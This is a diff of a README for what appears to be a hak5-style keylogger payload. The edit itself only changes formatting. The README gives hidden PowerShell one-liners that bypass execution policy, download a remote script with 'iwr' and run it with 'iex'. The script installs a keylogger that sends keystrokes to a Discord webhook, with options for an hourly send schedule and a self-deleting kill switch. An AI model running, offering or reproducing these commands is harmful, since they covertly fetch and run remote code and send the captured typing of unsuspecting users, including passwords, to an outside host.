@@ -1,3 +1,5 @@
+---
+---
 ![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
 
 <!-- TABLE OF CONTENTS -->
@@ -42,9 +44,9 @@ This is the basic command to install the keylogger and provide the webhook for t
 
 * <code>$dc=''</code> is the variable where you plug in your discord webhook 
 
-```
+<pre><code>
 powershell -w h -NoP -Ep Bypass $dc='https://link.iamjakoby.com/xxxx';iwr "https://jakoby.lol/m2m" | iex
-```
+</code></pre>
 ### ADDITIONAL PARAMETERS
 
 The payload is set to send the logs collected every hour on the hour
@@ -58,9 +60,9 @@ You also have the option of setting up a killswitch to have the keylogger self d
 
 Calling the script with both a <code>log</code> time and <code>killswitch</code> will look something like this: 
  
-```
+<pre><code>
 powershell -w h -NoP -Ep Bypass -command "$dc='https://link.iamjakoby.com/xxxx';$log='09:00 pm';$ks='12/25/2022 10:00:00 PM';iwr 'https://jakoby.lol/m2m' | iex"
-```
+</code></pre>
 ### DELETING THE KEYLOGGER
 
 Just hold <code>Left Control</code> + <code>Right Control</code> for 5 seconds untill the notification box pops up
